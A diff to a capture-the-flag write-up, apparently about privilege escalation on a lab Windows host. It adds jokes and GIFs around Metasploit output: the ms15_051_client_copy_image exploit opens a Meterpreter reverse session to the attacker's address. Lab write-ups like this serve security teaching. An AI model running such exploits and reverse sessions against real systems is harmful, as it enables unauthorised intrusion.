@@ -123,7 +123,15 @@ Looks like Priv esc should give us both the flags.
 Time to go huntin.
 
 
+The first thing we try is using the exploit suggester
+
+Not a single exploit is working!!!!!
+
+![Alt test](https://media.giphy.com/media/xT5LMWJSXHRbSusYve/giphy.gif "DOH!")
+
 After some enumeration we see that there are a couple of processes running under NT AUTHORITY 
+
+Maybe if we go to that process and then run our exploits!
 
 ```{r, engine='bash', count_lines}
 meterpreter > ps
@@ -206,6 +214,9 @@ msf exploit(ms15_051_client_copy_image) > exploit
 [*] Meterpreter session 2 opened (10.10.14.248:4443 -> 10.10.10.14:1041) at 2017-10-15 23:36:44 +0530
 meterpreter > 
 ```
+
+![Alt test](https://media.giphy.com/media/nXxOjZrbnbRxS/giphy.gif "index.aspx")
+
 
 **user.txt**
 ```{r, engine='bash', count_lines}
